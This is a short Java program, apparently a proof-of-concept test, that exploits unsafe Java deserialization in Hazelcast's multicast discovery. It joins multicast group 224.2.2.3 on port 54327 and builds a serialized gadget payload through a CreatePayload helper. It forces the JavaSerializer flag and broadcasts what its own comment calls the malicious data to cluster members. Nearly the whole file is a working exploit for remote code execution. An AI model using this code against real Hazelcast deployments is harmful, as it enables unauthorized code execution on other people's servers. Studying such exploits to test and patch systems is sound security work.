package com.hazelcast.test.deserialization.symmetricencryption;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.net.DatagramPacket;
import java.net.InetAddress;
import java.net.MulticastSocket;
import java.nio.ByteBuffer;

import com.hazelcast.nio.Packet;
import com.hazelcast.test.deserialization.AbstractEnterpriseParent;
import com.hazelcast.test.deserialization.CreatePayload;

public class GettingStartedClient extends AbstractEnterpriseParent {

    public static void main(String[] args) throws Exception {
        InetAddress group = InetAddress.getByName("224.2.2.3");
        int port = 54327;
        byte[] data;
        try (MulticastSocket sock = new MulticastSocket(port);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            sock.joinGroup(group);
            oos.writeObject(CreatePayload.createPayload("geany"));
            data = bos.toByteArray();
            int msgSize = data.length;

            ByteBuffer bbuf = ByteBuffer.allocate(1 + 4 + msgSize);
            bbuf.put(Packet.VERSION);
            // Set the flag to use JavaSerializer
            bbuf.putInt(-100);
            // Put the malicious data in
            bbuf.put(data);
            byte[] packetData = bbuf.array();
            DatagramPacket packet = new DatagramPacket(packetData, packetData.length, group, port);
            sock.send(packet);
            sock.leaveGroup(group);
        }
    }
}
